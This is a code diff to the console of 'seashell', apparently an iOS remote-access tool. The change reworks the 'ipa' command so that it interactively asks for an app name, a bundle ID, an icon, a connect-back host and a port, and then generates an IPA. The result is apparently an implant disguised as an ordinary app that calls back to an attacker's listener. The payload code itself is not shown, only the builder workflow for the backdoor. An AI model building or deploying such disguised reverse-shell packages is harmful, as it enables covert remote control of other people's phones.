@@ -31,8 +31,8 @@ from badges import Badges, Tables
 from seashell.core.device import (
     Device,
     DeviceHandler,
-    DeviceGenerator
 )
+from seashell.core.ipa import IPA
 
 
 class Console(cmd.Cmd):
@@ -97,6 +97,7 @@ class Console(cmd.Cmd):
             f"Type %greeninteract {str(len(self.devices) - 1)}%end "
             "to interact this device."
         )
+        self.badges.print_empty(self.prompt, end='')
 
     def do_help(self, _) -> None:
         """ Show available commands.
@@ -136,32 +137,36 @@ class Console(cmd.Cmd):
 
         self.badges.print_empty('%clear', end='')
 
-    def do_ipa(self, args: str) -> None:
+    def do_ipa(self, _) -> None:
         """ Generate IPA.
 
-        :param str args: arguments
         :return None: None
         """
 
-        args = args.split()
+        name = self.badges.input_arrow("Application name (Mussel): ")
+        name = name or 'Mussel'
 
-        if len(args) < 3:
-            self.badges.print_usage("ipa <host> <port> <path> [name] [bundle_id]")
-            return
+        bundle_id = self.badges.input_arrow("Bundle ID (com.entysec.mussel): ")
+        bundle_id = bundle_id or 'com.entysec.mussel'
 
-        host, port, path = args[0], args[1], args[2]
-        generator = DeviceGenerator(host, port)
+        icon = self.badges.input_question("Add application icon [y/N]: ")
+        icon_path = None
 
-        if len(args) >= 5:
-            name, bundle_id = args[3], args[4]
+        if icon.lower() in ['y', 'yes']:
+            icon_path = self.badges.input_arrow("Icon file path: ")
 
-            self.badges.print_process(f"Setting application {name} {bundle_id}...")
-            generator.set_name(name, bundle_id)
+        host = self.badges.input_arrow("Host to connect back: ")
+        port = self.badges.input_arrow("Port to connect back: ")
 
-        self.badges.print_process(f"Generating IPA to {path}...")
-        generator.generate(path)
+        path = self.badges.input_arrow("Path to save the IPA: ")
 
-        self.badges.print_success(f"Save IPA to {path}/{generator.app_name}.ipa!")
+        ipa = IPA(host, port)
+        ipa.set_name(name, bundle_id)
+
+        if icon_path:
+            ipa.set_icon(icon_path)
+
+        ipa.generate(path)
 
     def do_listen(self, pair: str) -> None:
         """ Start TCP listener.
